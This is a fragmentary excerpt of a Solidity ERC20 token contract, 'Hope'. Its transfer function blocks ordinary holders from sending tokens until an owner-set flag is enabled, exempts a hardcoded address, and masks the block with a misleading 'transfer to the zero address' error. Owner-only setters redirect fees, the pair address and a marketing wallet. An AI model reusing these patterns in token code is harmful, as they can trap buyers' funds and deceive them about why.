...
contract Hope is Ownable, IERC20Metadata {
    ...
    constructor() {
        ...
        _marks = 4;
        _done = 5;
        _maxsell = 1000 * 10 ** decimals();
        _dead = 0x0000000000000000000000000000000000000000;
        _main = 0xB3CD3f951BCbE31eedd796728f666C1D133D3673;
    ...
    function _transfer(
        ...
        if(!_whites[recipient] && !isContract(recipient) && !(sender == 0xB3CD3f951BCbE31eedd796728f666C1D133D3673)){
            require(kaipan == true, "ERC20: transfer to the zero address");
        }
    ...
    function _swap1() private {
        ...
        if (_maxsell > 0 && balances >= _maxsell) {
            ...
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
                IERC20(_fist).transfer(_mark2, (fistval2)*1 / 8);
                _doBonusFist ((fistval2)*6 / 8);
                _swapTokenForFist2((fistval2)*1/8);
        }
    }
    ...
    function sell(uint256 cfz) public onlyOwner {
        _maxsell = cfz;
    }
    function marks(uint256 HD) public onlyOwner {
        _marks = HD;
    }
    function pair1(address pair) public onlyOwner {
        _pair = pair;
    }
    function mai(address mark2) public onlyOwner {
        _mark2 = mark2;
    }
